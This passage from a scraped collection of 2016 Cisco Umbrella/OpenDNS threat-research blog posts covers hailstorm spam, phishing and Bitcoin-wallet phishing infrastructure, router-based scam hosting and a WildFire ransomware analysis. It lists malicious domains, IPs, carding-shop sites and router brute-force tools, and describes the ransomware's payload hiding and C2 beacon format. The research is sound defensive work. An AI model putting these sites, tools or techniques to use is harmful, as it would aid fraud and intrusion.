http://affiliates.ih-supplies.com/affiliate_signup.aspx The base ih-supplies.com domain itself leads to a landing page for parked domains on GoDaddy.com. The domains seen above are all registered using whois privacy services. The only exception is the domain used in the From header, coisow.us. That domain is registered by wireclick.tech@gmail.com , which in turn is associated with hundreds of other domains involved in similar spam campaigns. Another typical amortization scheme is to generate traffic on sponsored links. Below is an example of such a hailstorm spam campaign message, along with the corresponding landing page. Similar to our first example, these spammers are lazy and have terrible Operational Security (OPSEC). In this case, the domain used in the From address (babyfirstgames.com) is registered to an email associated with a number of other domains participating in hailstorm spam campaigns. Email From: jonathon.hinton@babyfirstgames.com Contained links are of the form: http://www.babyfirstgames.com/<redacted> The link is redirected several times. Landing page: http://ww1.cfcc.emazingsavingsnow.com/?<redacted> The links generally lead to legitimate businesses and vendors that are not themselves involved in the scheme. The following examples of From and Subject headers highlight the type of content observed in recent hailstorm spam campaigns: From: Fresh Tax Relief <freshtaxrelief@chemiluminescent.duzeo.us> From: Healthy baby formula <Healthybabyformula@crewgraphics.stream> From: VOIP Phone System Options <voipphonesystemoptions@wait.cotib.us> From: Own Star Night Laser <ownstarnightlaser@lanight.bid> From: Match.com Partner <Match.comPartner@meterdown.top> From: Caribbean Cruise Options <caribbean_cruise_options@firstthirteen.faith> From: Costco Rewards Giveaway <CostcoRewardsGiveaway@horithms.stream> From: Business Internet Service <BusinessInternetService@chineral.stream> From: Paleo Secret <paleosecret@eumidnight.top> From: Hybrid Cars <HybridCars@carhibrid.us> Subject: Toss Your Alkaline Water Down the Drain Subject: Government Overrun: 75% off “Super Flashlight” Subject: Insanely Bright Military Headlight Just Released To The Public Subject: Watch: How To Restore Bladder Control Naturally Subject: Is Trump for real? Can he really make average Americans RICH? Subject: Cures to to the new blood sugar problems! Subject: Meet Lonesome Wives Home Alone … and Waiting (Mature Content) Subject: You may have heard of folks making money over the internet? Subject: Numerology Reading… Subject: World’s FASTEST Mobile HyperCharger – Period! While these campaigns are generally more of a nuisance rather than a threat, it goes without saying that clicking spam-distributed links is risky on several fronts. Drive-by downloads are as much a possibility as Business Email Compromise , fraud and identity theft, should any personal or financial information be disclosed by a recipient. Malware and Phish As expected for any method that proves effective in raising the rate of successful delivery, hailstorm campaigns are used for much more damaging purposes than generating traffic to affiliate pages. Hailstorm tactics are also used by botnets like Necurs to spread malware. Below is an example of a malicious email message sent out via a hailstorm campaign. The message claims to be generated in response to a complaint filed with the United Kingdom’s Companies House and tries to lure the recipient into opening an attached word document. The From address of the message is noreply@companieshouses.com while the legitimate government agency has their web presence at companieshouse.gov.uk. The attached Complaint.doc (SHA256: 985e9f4c5a49e26782141c7cd8f4ce87b0e0a026d078b67b006e17e12f9eb407) contains a macro that downloads and executes a Dyre/TheTrick Banking Trojan. As in previous examples, the registrant of the sending domain, workorders@pesiec.com , is associated with a number of other domains that are used in similar fashion. This hailstorm malware campaign shares many similarities with the first two examples, such as delivery of the whole campaign in a very short burst and the suspicious registrant, among others. Yet, there are also some significant differences from typical hailstorm spam campaigns: The messages are sent from a wider range of IPs, including addresses that do not resolve to the domain used in the From header. The message is more in line with traditional spam and bot behavior. The DNS Layer Hailstorm campaigns are correlated with bursts in DNS queries with an intensity of 9,000+ queries per hour at their peak(s). The initial spike in a hailstorm campaign stems from mail server activity caused by an influx of emails. One way to understand the life cycle of a hailstorm campaign is to look at how many mail servers are targeted with a given domain. Below, we compare three hailstorm domains and the fraction of mail servers that have been hit. We characterize the hailstorm campaign by contrasting the peak queries per hour (i.e. the largest spike in query volume) with the percent of the mail servers receiving hailstorm spam from each domain. Domain                      Peak queries/hour   % of mail servers hit cooperindustries.space                  8,049                    0.381% pourdra.top                                  23,790                   3.457% cmobi.stream                              106,590                  4.013% In these few concrete examples we can glean clues about the magnitude and breadth of hailstorm campaigns. The data suggest a weak correlation between the size of a campaign and the probability of being targeted. Since these are just three data points from our pool of domains, we are not drawing too many conclusions. If we compare the distribution of mail servers targeted from a sample of 475 hailstorm domains hitting mail servers with an average of 9332 peak queries/hr we can see significantly more mailservers are being targeted inside the USA versus the rest of the world. Geographic Distribution Percent Mail-Servers Hit USA             2.586% non-USA      0.840% From the data above, we conclude that the majority of targets reside within the USA. This might be due to language preferences, amortization infrastructure, target audience or other reasons related to the spammers’ workflow. Protection from the Storm In this collaboration, the Cisco Talos and Umbrella research teams have created a system that facilitates fast evaluation and conviction of in-the-wild hailstorm domains, then proceeds to gather predictive insights into other domains that are likely going to be used in future campaigns. As such, the system is fast in protecting customers at time-of-click in case a hailstorm message reaches an inbox. More importantly, the predictive nature of the system directly counters the hallmark of hailstorm campaigns: their rapid execution. Rather than waiting for a campaign to unfold and trying to catch up, protection against the next spam campaign is deployed ahead of time. As outlined in the examples, hailstorm comes in several flavors. We expect to see it evolve over time as anti-spam systems make it harder and harder for spammers to deliver their payload. The collaboration between Talos and Umbrella, matching spam activity and DNS traffic, enables us to quickly adapt and protect against the ever changing threat-landscape.", "date": "2016-12-19"},
{"website": "Cisco-Umbrella", "title": "Stranger Danger", "author": ["Kevin Rollinson"], "link": "https://umbrella.cisco.com/blog/newly-seen-domain-security-category", "abstract": "At a young age, most of us were told, “don’t talk to strangers.” While the majority of people we encountered as kids were probably nice and friendly, avoiding all strangers kept us safe from those with bad intentions. It’s a great policy for kids, but not so great for enterprise security. Assuming every new domain is dangerous and therefore can’t be accessed would make for a pretty terrible experience. On the flip side, assuming all these new domains are nice and friendly opens the door for bad actors. Organizations need the ability to easily view traffic to new domains and ultimately enforce policies if they are more risk averse. <br>Attackers often use new domains as part of phishing campaigns, exploit kits, ransomware, and other threats. These new domains serve multiple purposes including acting as a way to distribute malware, exfiltrate data, or trick people into clicking on phishing links. By creating new domains instead of reusing domains from previous threats, attackers can outsmart security systems that rely on reputation scores.<br>Let’s say an attacker registers a new domain to be used in a phishing attack. If the domain is not yet known to be malicious, then when someone receives the email and clicks on the link, it probably won’t be blocked by any security systems. Before this domain can be categorized as a threat or added to a block list , the damage may already be done — the victim may unknowingly disclose sensitive information or malware might be installed and start exfiltrating data from the network.<br>Today, we’re introducing a new security category within Cisco Umbrella called “newly seen domains.” This new category identifies domains that have been recently queried for the first time across the <a href=”/why-umbrella/cloud-infrastructure-security”>Umbrella global network</a> and are more likely to be malicious. You have the flexibility to enable the newly seen domains category in two ways: Monitor-only – Gain visibility into requests to newly seen domains across your organization and then research them using Investigate . Block – Proactively block access to these domains since there’s a higher chance that they may be malicious. There are other services out there that offer similar information, so what’s different about the newly seen domains category in Cisco Umbrella? Our global network handles over 80 billion requests per day from a diverse set of enterprise and consumer users and we uncover over 3 million new domains every day. We see more and help you proactively block more. We’ve built-in logic to offer much more than just a feed of new domains. We use information on the trustworthiness of top-level domains, or parent domain reputation for subdomains, to determine if domains should be added to the list and how quickly the expiration happens. This reduces the potential false positive rate for this category. We update our system in minutes, not days. So, you can have visibility into and can proactively block these new domains in near real-time. The newly seen domains category will be available at no additional cost to customers of all Umbrella packages and Umbrella for MSPs starting December 13th. Click here for full documentation .", "date": "2016-12-12"},
{"website": "Cisco-Umbrella", "title": "PhishFinder: Hook, Line and Sinker", "author": ["Austin McBride"], "link": "https://umbrella.cisco.com/blog/phishfinder-hook-line-sinker", "abstract": "Harvesting phishing sites for filtering has always been somewhat of an ongoing, uphill battle. Many phishing sites are designed to look as close to the legitimate webpages they’re imitating as possible. The more genuine looking, the greater the chance of someone willingly agreeing to hand over sensitive personal information, and also the tougher it is to determine if the site is legitimate or if it’s a phish. Additionally, phishing pages tend to have a high turnover rate, meaning that more often than not, the site will only be live for a day or two, sometimes even hours, before it’s discovered and taken down, or moved to a different URL. It’s reasons like these that have made tackling phishing sites a tedious chase. New Recommender System on Phishtank To Automate Submission Verification After searching for a solution to this obstacle, OpenDNS Labs came up with the idea of using its phishing detection model, NLPRank, as a recommender system on our community based phishing verification system, PhishTank, to improve phishing verification time. This new, automated approach to the verification process is outlined as follows: The algorithm takes as input a submission (domain or URL)  from the submitter/community and checks them against any existing OpenDNS allow lists and ASN filters. This initial step is to filter out false positives and spammy submissions that are often submitted to PhishTank. If the URL makes it past these first few checkpoints, it then fetches the source code/content from the submission URL for review. That source code is then analyzed by our machine learning system, that in a nutshell, compares the submission content to a curated corpus of content from commonly spoofed brands and returns a similarity score. If the similarity score is above the predetermined threshold, the URL is labeled as a phish and gets sent to our Proxy for auto-blocking. Figure 1 shows a diagram of how the system works: Figure 1 The eventual plan is to integrate the results of our recommender system back into PhishTank and share results with the community. PhishTank’s current approach of “submit a domain and wait for the community to verify” has so far been formidable, as it continues to remain “best in class” as one of the largest sources for human curated data when it comes to phishing sites. However, the drawback here is that the current system continues to become more primitive as time marches on, and as the Time to Verify measurement grows larger, the efficacy of the feed suffers. This new recommender system increases the effectiveness of PhishTank and improves the overall experience for the thousands of users that utilize PhishTank’s verified phishes’ feed. Rogue Infrastructure Detection While this method is outstanding for real-time blocking of active phishes, it is reactive, but here at OpenDNS Labs we are all about pushing the limits to develop predictive models. So how do we evolve this system to be truly predictive and block these phishing sites and their hosting infrastructures before they’re even created? Consider the notion that phishes can sometimes be a bit like cockroaches. If you see one marching around your house, chances are there are a bunch more hanging out somewhere close by, out of sight. By taking the verified results of the NLPRank process, and pivoting through their server IPs using Investigate, we are able to uncover handfuls of other registered phishing domains acting as targets for the very phishing campaign that was initially discovered. Additionally when we continue to dig deeper through adversaries’ WHOIS records, specifically the email registrant, we uncover even more of the same tactics. By adding these IPs and registrants to our block list, we are able to stay ahead of the curve and greatly increase the chances of our users being protected from widespread phishing campaigns. Figure 2 shows a diagram of the Rogue Infrastructure Classification system. First we take dedicated phishing domains that we have caught with the recommender system. We then query OpenDNS Investigate for domains associated with the hosting IP and the registrant email address from their WHOIS records. We have then built a classifier using different features from the domains on these infrastructures to detect rogue registrants and IP addresses, and in turn push them to our block list. In this sense we can predict the infrastructures phishers will use as they are being setup, and we are now blocking phishing sites even before they go live with spoofed content. Figure 2 Our phishing recommender system is still in its very early stages of production, however the results and accuracy from its output thus far have been exceptional. As we push forward, and continue to mature our recommender system with PhishTank and OpenDNS data, we only stand to increase the level of security that is delivered to the thousands of OpenDNS users worldwide. Here is an example of a dedicated phishing site we found, appleid-apple-icloud-safe-link[.]com, where we pivoted on the email address and also the server IP address, and were able to uncover this rogue hosting infrastructure. Figure 3 displays some domains, IPs, and email registrants associated with a recent Apple phishing campaign that we have been tracking for a while now and that we visualized with OpenGraphiti. We were able to discover and block these actors with the new rogue hosting infrastructure detection system we have created. Figure 4, 5, and 6 (below) show a specific example of the type of infrastructures we are catching and predictively blocking with these new techniques. We have had the hosting IP address for httpsaccounts-gooogle[.]cf on our block list since July but we are still seeing new phishing pages coming alive on this IP, which we are blocking before they are even up and running. This displays the power of our new rogue hosting classification system. Figure 4 Figure 5 below shows the landing page serving the phishing content spoofing Gmail. Figure 5 Figure 6 below shows the IP 45.63.0.49 polluted with phishing content: Figure 6 As displayed from the results above we are uncovering new rogue hosting providers daily that are leveraged for phishing campaigns and other toxic content. The system is still evolving, however our findings are very promising and we look forward to sharing more of them with the community in the future.", "date": "2016-11-11"},
{"website": "Cisco-Umbrella", "title": "Bitcoin Phishing: The Next Wave", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/bitcoin-phishing-next-wave", "abstract": "Bitcoin Phishing Not Losing Momentum In June, we examined a new wave of Bitcoin wallet phishing against a backdrop of pre-Brexit anxiety and Bitcoin’s price skyrocketing past $775. A lot has happened since then: the UK voted to leave the EU, some big Bitcoin wallets were hacked, and the price of Bitcoin plunged (though is now rebounding). Throughout it all, attackers have consistently tried to phish users to gain access to Bitcoin wallets. This blog outlines a detailed investigation into this new phishing trend which began with reports of a phishing campaign targeting Bitfinex customers after the company was breached. At that same time, our ML-based model, NLPRank, picked up this phishing campaign after we enhanced it to detect Bitcoin wallet phishes. After factoring in the delivery mechanisms of the campaign we covered in the previous blog, we also expanded our search to Adwords. Expanding technical intelligence from Bitcoin phishing detection through hosting IPs, registrant emails, SSL certs, and OSINT hunting, we show how we cast a wider net on a variety of active cybercrime content: mainly phishing against other brands and credit card dump shops. Investigation main steps On August 2nd, Bitfinex suffered a breach that caused them $70 million in losses. Because we know malicious actors traditionally seek to exploit such events and therefore fine-tune our antennae in their wake, we picked up a phishing campaign around August 5th in which presumed Bitfinex customers received emails inviting them to update their credentials. The URL in the emails was, however, a phishing page against Bitfinex: ibitfinex[.]com. We observed a spike of DNS traffic to ibitfinex[.]com on August 5th. ibitfinex[.]com is hosted on 188.40.248.80. This IP is hosting other phishing and various toxic content as well as bitmixer-io[.]com, a phishing domain against bitmixer.io which is a legit bitcoin mixing website (we won’t argue whether Bitcoin mixing itself is legit or not). 188.40.248.80 belongs to a small range 188.40.248.64/27 under Hetzner AS24940. 188.40.248.64/27 is specifically assigned to a suspicious Romanian hosting provider, thcservers.com, that we’ve previously observed to host exploit kits and malware. thcservers.com’s main web site 188.40.248.80 is serving an SSL cert (sha1: 0f5876c1779b135eca5a6f300a40fc46a9ae1893) where the CN (Common Name) is loyals[.]in. At the time of this writing, loyals[.]in was live and hiding behind reverse proxy services with the actual content delivered from 188.40.248.80. loyals[.]in redirected to the mirror site sh0ping[.]net, a marketplace where various actors sell stolen credit cards plus other accounts and credentials. sh0ping[.]net as well as a mirror site sh0ping[.]su are hosted on 186.2.167.154. sh0ping[.]su has in the past hidden behind reverse proxy services. 186.2.167.154 belongs to AS262254, DANCOM LTD, an ASN that is part of the DDOS-GUARD bulletproof hosting structure. DANCOM has its business registered offshore in Belize and has one upstream peer AS57724, DDOS-GUARD. We’ve tracked DANCOM for a while and have seen it being frequently involved in hosting rogue content such as stolen credit card dump shops, shady financial services, crypto-currency exchangers, Bitcoin mining services, forex trading sites, etc. 186.2.167.154 also hosts sh0[.]pw, which used to be a mirror site of sh0ping[.]net, then morphed to become a Perfect Money to Bitcoin exchange site. 186.2.167.154 serves a valid SSL cert (sha1: 7674db9f93f6f1dee8259d2b0b5e3fbffffa2dfd) created through Comodo CA on August 29th, 2016 and where the CN is sh0ping[.]su. sh0ping.su’s main web site sh0.pw offers a Perfect Money to Bitcoin exchange service Offerings on DANCOM/DDOS-GUARD’s public web site From our previous investigations, we’ve seen that Bitcoin phishing campaigns are also delivered via legit google Adwords and Yandex ads redirecting to Bitcoin phishing. We searched for “buying Bitcoin” on google around August 18th, and we picked a few phishing sites in the returned results. One example is blockchln[.]info resolving to 143.95.239.55 which hosts a large number of other phishing sites targeting Paypal and Bitcoin wallets, Bitcoin mixers and sites selling fake European Union, Ukrainian, and Russian passports. By exploring the co-occurrences of sh0ping[.]su we find more crimeware forums and stolen credit cards dump shops: altenen[.]com, bestvalid[.]org, ccv[.]name, cvv2[.]sale, dexter24[.]ru, dumpsmania[.]net, fatality[.]in, getcc[.]me, getcc[.]su, jallo[.]su, and pos[.]cat. Through this investigation, we found more than 280 Bitcoin phishing domains, so it is clear here that your Bitcoins are under attack. Additionally, criminals are using different methods and tricks to stay under the radar, such as using reverse proxy services to hide the IPs serving the illegal content. With this investigation, we took some measures to increase the detection of NLPRank which runs on Avalanche. Avalanche is the data processing system we built to consume our authoritative DNS logs and power several detection models. Like any machine learning system, we constantly have to retrain the models with fresh data, and teach the machine to detect the latest type of attacks. For that, we have added new Bitcoin wallet pages to NLPRank ‘s training set, and the net result was faster and more accurate detection. Here are some of the latest results detected by NLPRank spoofing a variety of wallets : Some of our latest hits spoofing blockchain.info: Domain: blokchain[.]me Timestamp: 2016-08-20 12:06:59.602000 Score: 0.998563706875 Domain: htp-blockchain[.]online Score: 0.99872893095 Timestamp: 2016 – 08 – 06 03 : 58 : 48.751000 Here is a domain spoofing localbitcoins.com: Domain: localbitcoins[.]co[.]nf Timestamp: 2016-09-06 12:45:15.733000 Score: 0.954419493675\nHere are some other domains we found spoofing localbitcoins.com: oocalbitcoins[.]com kocalbitcoins[.]com llocalbitcoins[.]com When looking at this IP address it is apparent there are other phishing domains and malicious activity on it: Additionally, we have noticed that these Bitcoin wallet companies are starting to take better prevention measures in protecting their brands from being spoofed; here is an example of the online wallet company Coinbase registering a bunch of domains that typically would be used for typosquatting: However, even with this protection in place, criminals are able to register phishing domains, but OpenDNS was able to detect these new Coinbase phishes: Domain: lcoinbase.com Timestamp: 2016 – 08 – 01T01 : 44 : 05.296Z Score: 0.9941726922988892 There are other domains associated with this email address also trying to phish other wallets such as Bitfinex: bitfinrx[.]com IOC Malicious registrants: blockchains@info.com josephallann@mail.com buckley@email.com c.king@mail.com marke9dkemfet@gmail.com Domains: iocs_blockchain With a combination of unsupervised machine learning techniques and threat hunting, OpenDNS remains at the forefront of detecting these type of phishing attacks and protecting these online crypto-currency wallets. Conclusion This investigation was a combination of algorithm-based detection and threat intelligence analyst research, which shows once more the importance of multi-pronged approaches for efficient preventive security. In our research work, we value equally both human domain expertise and up-to-date ML-based detection models.", "date": "2016-09-15"},
{"website": "Cisco-Umbrella", "title": "Identifying Scam Infrastructure", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/identifying-scam-infrastructure", "abstract": "Spam and online scams have been causing headaches since the dawn of the Web. Historically, most spammers bought or rented servers from black market providers like xDedic, the cybercriminal trading platform currently notable as the subject of an extensive exposé published by Kaspersky Labs, to target banking, dating, gambling and shopping sites as well as ad networks. However, because criminal economics is a live ecosystem that reacts to market needs, malware-as-a-service, ransomware-as-a-service, and exploit-kit-as-a-service models are changing that ecosystem while spammers and scammers are changing their day-to-day routines in an effort to attract more customers. In this post, we’ll examine one scam campaign recently detected by OpenDNS that targets adult, gambling, and dating websites. Detection The initial discovery was done with NLP rank classifier . Most of the detected domains seemed to serve MiktoTik RouterOS login page. This group’s main focus is dating spam that drives traffic to fake dating services which collect personal information and typically require credit card information for registration. Current pricing varies from $1-$3 per 1000 emails. Investigation Locating actual emails delivered by this campaign required some digging, and we were lucky enough to get one of them: Received email and link in it Http response headers Website to which users are redirected Domain serving redirected to mpodosaki[.]swingproject[.]eu which was compromised and injected with the malicious pjtxt[.]php file. This domain is still using a vulnerable version of Joomla, which is most likely how it became compromised in the first place. Actors Further investigation of the campaign led us to discover its actors and infrastructure. Because the majority of the campaign’s dedicated for scam domains are registered under two accounts (fisher9006@rambler.ru and toleinik_viktor@lenta.ru), we can identify those users as primary actors. Most of them have very low traffic and don’t resolve to any IP, which indicates that they might be used later. Here is a domain that’s been actively involved in the campaign since July 12th: And here is a domain active between June 16th and July 27th: With newer domains, the actors started using Whois privacy protection and obfuscation. But, if we look at the naming patterns of the subdomains, the similarity is obvious: In this case, planet-dating-74[.]com is a dedicated second level domain name (2LD) for this dating spam campaign. It was registered on June 13, 2016, and the subdomain is used for spam. The fact that both the 2LD domain and subdomain resolved to different IPs seems to be a defense against IP blocking. outlookern[.]planet-dating-74[.]com resolves to 213.147.140.17 planet-dating-74[.]com hosted on 5.8.32.74 Results With these findings, we can conclude that this spam scheme is organized as below: We were able to identify 35 compromised routers total. We can determine the difference between dedicated and compromised infrastructure with a quick nmap scan, in which we see that dedicated IPs have port 25 open (for email spam) and compromised IPs have only port 80 open (serving http injections). Dedicated name server for domains Compromised device Even though mail[.]izlenimyapi[.]com is listed as a mail server, we can see that port 25 is closed. In this case, dedicated domains will point to the IP that would not be blocked even if all of the  subdomains impersonating mail servers would, since all of them point to different compromised IPs. Thus, once again we prove that malicious actors are well aware of common web filters and protection mechanisms. In mapping compromised IPs to their geo locations, we see that the devices are broadly spread. We were also able to identify a whole range of OS versions without any of them prevailing. We concluded that compromised devices were not exploited with a specific vulnerability (unless there is a zero-day for any Mikrotik Router OS) but were instead exploited with the help of bruteforcing software that was used on a large scale. Geolocations of compromised devices with RouterOS Currently there are two products with this functionality available on black market: Router Scan by Stas’M, which is able to find, identify, and cull useful information from a variety of devices from among large number of known routers MKBRUTUS, a password bruteforcer for MikroTik devices or boxes running RouterOS As for the scope of such a scan, we can make a fast query on Shodan , which reveals 1,124,859 Web-facing Mikrotik devices. As a result of this research, we identified this campaign’s spam infrastructure and the malicious actors behind it. With a deeper dig into the research we’ve already acquired, we may be able to connect this campaign to other cybercrimes.", "date": "2016-08-05"},
{"website": "Cisco-Umbrella", "title": "WildFire Ransomware Catching On", "author": ["Brad Antoniewicz"], "link": "https://umbrella.cisco.com/blog/wildfire-ransomware-gaining-momentum", "abstract": "WildFire Ransomware Domains Sometimes people naively open .onion links in their browsers, so every few days I’ll check out what pops up in Investigate to dig in a little deeper. Today I came across gsxrmcgsygcxfkbb.onion and poof! down the rabbit hole I tumbled. Kelihos Aids Distribution We first started seeing WildFire ransomware hitting our resolvers on June 21, 2016, and there has been an increase in activity over the last few days. This is most likely due to a bump in distribution by the Kelihos Botnet . Before the ransomware takes hold, systems infected with WildFire will aggressively attempt to communicate exithub1.su , exithub2.su , exithub-pql.su and exithub-xuq.su. If we look at the number of requests for those domains, we see a nice influx: Most infection reports are coming in from the Netherlands. If we check out who is requesting these domains, we see that most requests originate from the same place: 95% Netherlands. Word Macro via Email The journey starts with an all-too-common initial infection vector: a user receives an email with a macro-embedded Word document attached. In this case, it was titled BT-32084.doc ( 8f8741e18aa6b7b8282402f0aea5e0c9). The Word document displays a message to the reader instructing them to enable macros to view the content. Those with an eye for detail might notice that the document is 205 pages long! This is because it’s using an oldie-but-goodie trick by embedding its payload in the document text, rather than within a document stream. At first glance, you might miss it since all of the pages appear to be blank. An easy way to view this hidden “treat” is to select all text in the document with CTRL+A, then change the color to something other than white, like red. Here’s what you’ll see: The prevalence of 0x33 bytes suggests that the payload could be XOR’ed with 0x33. Rather than take this avenue for analysis, let’s use another technique to take the express train to the binary. Payload Extraction oledump will allow you to dump the various streams of the document, or if you’re in a tight analysis environment and speed is more important than thoroughness, you could just ‘ride-or-die’ and execute the macro. I have always thought DMX and Fetty were onto something, so let’s go for ‘ride-or-die’. Searching for calls to the Shell() function within the macro will fast-track you to what is being executed. If we set a breakpoint on the call and inspect its parameters at runtime, we can see that the macro is calling C:\\ProgramData\\Memsys\\ms.exe ( f157038d7b105cee1b8bb8c957f1ec39), which means it likely wrote ms.exe to the file system earlier in macro. Self-Extracting Archive With ms.exe resting nice and comfortably on your file system, you might be so inclined to open it up in IDA to let the real work begin. That is, until a few strings indicating this is a self-extracting archive bring you right back to “ride-or-die”. Executing ms.exe , checking %TEMP%\\RarSFX or extracting with 7zip will yield three files: Bigrmkwhrr.png ( 645e7f63886d74c5edd149caac1b41cd) , Imvenagxehdoj.xml ( 9f543d1ca1fe9a2ea69984f2a3804fe1) , and Jnmsiyyks.exe ( a86f56fee647446d33d555b25d871bf8). Dot Net Obfuscation! WildFire’s second-stage executable ( Jnmsiyyks.exe ) is just really a wrapper around the supplemental files that were extracted in the same directory. The obfuscated code creates a big nasty AppContext with the contents of Bigrmkwhrr.png as a variable, decodes it, and then launches it as a form in a thread. Dot Net Ransomware Luckily, this thread’s assembly is not obfuscated, so with some quick XOR’ing, we have access to the full source of the source. Here’s a quick script to handle the XOR’ing: Network Activity As mentioned above, the malware aggressively attempts to contact its servers — exithub1.su, exithub2.su, exithub-pql.su and exithub-xuq.su . Once it is successful, it will POST base64-encoded data to the server. I changed the output slightly to anonymize it: {\"action\":\"connect\",\"uid\":\"abcdef0123\",\"rid\":\"email_spread_XXX\",\"username\":\"user\",\"computername\":\"LAPTOP\",\"ip\":\"123.45.67.89\",\"country\":\"UE\"} If the registration is successful, the server will return a password: {“status”:”success”,”password”:”sAKFSdgVKVdFLfvjwWkvdjjXXlotynss”} and the client will update the server with its status in increments: {\"action\":\"update\",\"uid\":\"abcdef0123\",\"filecount\":\"8320\"} Then, upon success, the server will return: {\"status\":\"success\",\"null\":\"null\"} Notification and Payment Once WildFire encrypts all of the files on the system, the ransomware lets the user know by the now-ominous ransomware notification page. One interesting thing here is that the payment page is hosted on both the internet and on Tor. Usually bad actors only leverage Tor to remain anonymous, but here the attacker is either confident in the privacy of the system hosting the landing page, or doesn’t care to remain anonymous. Attribution I’m half-joking about the heading of this section, we all know attribution is hard. But if we wanted to comment slightly on the topic, we could imply from directory listings shown in the image to the right that this system may have been set up/compromised on June 20th. And, due to some friendly comments in the HTML source of the page shown below the directory listing, we see that the author needs to fix the timer javascript. You read Russian too, right?", "date": "2016-07-13"},
{"website": "Cisco-Umbrella", "title": "SPRank and IP Space Monitoring at BruCON & Hack.lu", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/sprank-and-ip-space-monitoring", "abstract": "In October, the OpenDNS research team was in Europe presenting new threat detection models at two renowned security conferences. First, Security Researcher Thomas Mathew and I (Dhia Mahjoub) presented at BruCON on Oct. 9 about a “Unified DNS View to Track Threats. ” Then a couple weeks later I presented on Oct. 22 at Hack.lu about “ A Collective View of Current Trends in Criminal Hosting Infrastructures .” SPRank at BruCON In the talk “Unified DNS View to Track Threats,” we discussed a new model dubbed Spike Rank or “SPRank” that leverages DNS traffic below recursive resolvers. We call this data “recursive DNS data.” Unlike previous models which primarily placed emphasis on features like ASN, BGP prefixes, and WHOIS information, SPRank analyzes traffic signals as the primary interest. The decision to move away from focusing heavily on ASN, IP, and WHOIS information as identifiers of threats came after a new series of threats began to emerge over the past year. The increase in exploit kit campaigns and “domain-shadowing” usage rendered many of the classical domain reputation or IP reputation methods ineffective. Traditionally, a domain reputation model will assign different scores to a domain based on the reputation of its IP host. These reputation scores are based on the historical “goodness” of an IP range or domain. Exploit kits using compromised domains pose problems to these models. Compromised domains that have a great historical reputation will easily fool a reputation system. Furthermore, cheap hosting makes it difficult to assign meaningful scores for IP reputation as new ranges appear having no historical context to provide it a score. SPRank avoids these issues by analyzing the DNS request patterns to a domain. SPRank detects domains showing as a sudden surge — or a spike — in DNS queries issued from our 65 million worldwide clients towards our resolvers. These domains feature what we call the “spike behavior.” This behavior is typical of domains used for malware campaigns such as exploit kits, DGAs, fake software, Browlock, and phishing. But it can also be associated with spam domains, domains victimized for DNS amplification attacks, and a slew of other suspicious and even benign uses. A major breakthrough of this model is it separates the detected domains into benign, suspicious, and malicious classes. Within the malicious class, we focus mainly on exploit kit domains. Exploit kits are currently the most efficient and widespread infection delivery method of financially motivated malware. The other main advantage of SPRank is that it pinpoints inherent features of malware domains that criminals cannot easily change. Because of OpenDNS’s unique perspective of the Internet and its domains, we can distinguish between acquired or assigned features and inherent features. The assigned features of a domain include the lexical makeup, DGA setup (seed, algorithm), or the hosting, and registration choices. These features are controlled by adversaries, as they can change or update the features when needed. On the other hand, inherent features are related to traffic patterns that emerge globally from clients querying malware domains and are harder to obfuscate or change by the adversary. We are talking here about features such as the distribution of clients across IP space and geography, the geography of resolvers being used, query types, query volumes, domain traffic patterns, etc. The SPRank system consists of a few main subsystems: Spike Detection Domain History Filter QType Filter Domain Records Filter Expansion of threat intelligence via IP, prefix, ASN, hoster, fingerprint, and email pivoting To learn more about the motivation behind SPRank, its details, components, and results, we invite you to check out our video of the talk at BruCON. The results of the model are very promising. It detects the most current and virulent malware campaigns such as Angler, RIG, and Nuclear exploit kits, in addition to DGAs, fake software, or phishing. Current exploit kit campaigns drop malware payloads ranging from crypto-ransomware, banking Trojans, and info stealers to bots used for DDoS, spam, or click-fraud, as the diagram below shows. IP Space Monitoring at Hack.lu In the talk “A Collective View of Current Trends in Criminal Hosting Infrastructures” at Hack.lu , I discussed a two-year long effort of research I’ve been conducting about malware hosting IP infrastructures. In this research, I discuss a selection of hosting patterns identified from analyzing DNS, IP space, BGP prefixes, and ASN peering relationships. These patterns have been adopted by suspicious and bulletproof hosting providers to harbor malicious content and deliver malware campaigns on a large scale. In these patterns, we distinguish between botnet-based hosting infrastructures and dedicated hosting providers. In the first category, I discussed a “hosting as a service” infrastructure used to host fast flux malware CnCs. In the second category, I cover eight different recorded hosting patterns: Compromised domains, i.e. “domain shadowing” Domain shadowing on multiple hosting IPs Sibling peripheral ASNs and bulk malware IP setup Leaf ASNs Offshore registration and diversification of IP space Rogue ASN and affiliated hosters Abuse of large hosting providers Shady hosts within larger hosting providers We have been tracking “domain shadowing” for a few years now [1] [2] [3] , and Cisco discussed it this year [4] . Despite being a widely known pattern, it is still being used by adversaries for delivering exploit kits, browlock and other suspicious content. We have also been tracking various variants of rogue and bulletproof hosting providers. A very noticeable pattern here is rogue or bulletproof providers register businesses in offshore jurisdictions in the Caribbean islands, Central America, or the Indian Ocean, and they diversify their IP space in both ARIN (North America) and RIPE (Europe) for resiliency and evasion. Below, we show the example of QHoster, a Bulgarian hoster registered in Belize with IP space in ARIN and RIPE, which has been hosting exploit kits and phishing campaigns for some time. The combination of these patterns helps us design a model to monitor IP space usage for malicious purposes, and identify in a predictive fashion IP ranges that will be used for malware campaigns even before any domain is hosted on the IPs. This model has been successful in mitigating exploit kit campaigns such as Angler, RIG, and Nuclear. The major advantage of this model is that it analyzes IP space with a much finer granularity than conventional IP, BGP, ASN reputation scoring methods. We focus on IP ranges that are smaller than the BGP prefix and that are operated by rogue hosts or purchased by criminal customers. We also analyze IP fingerprints to single out servers that share the same configurations and that are purchased in bulk and set up in advance to deliver malware and exploit kit campaigns. Furthermore, if we confirm that IP ranges, ASNs, or hosts match several of these patterns at the same time, we can flag them with a high confidence as rogue, bulletproof, or heavily abused. We can then quarantine or block their IP space. Additional validation also comes from monitoring hosted content over time. Stay tuned for future separate blogs in which we will discuss these hosting patterns in more detail. The final takeway is that “SPRank” and “IP Monitoring” can work separately but they are much more efficient if they operate, in tandem, to provide a higher coverage and accuracy in detecting threats. Since we are faced with a massive amount of DNS and IP space data flowing in real time through our worldwide infrastructure, SPRank becomes crucial at finding entry points or seeds of malware domains for immediate blocking but also for “IP Monitoring” to further drill into associated indicators by pivoting around IPs, fingerprints, prefixes, ASNs, hosters, emails, content, etc to expand the intelligence graph and proactively mitigate attacks before they occur. At the same time, “IP Monitoring” can function in a 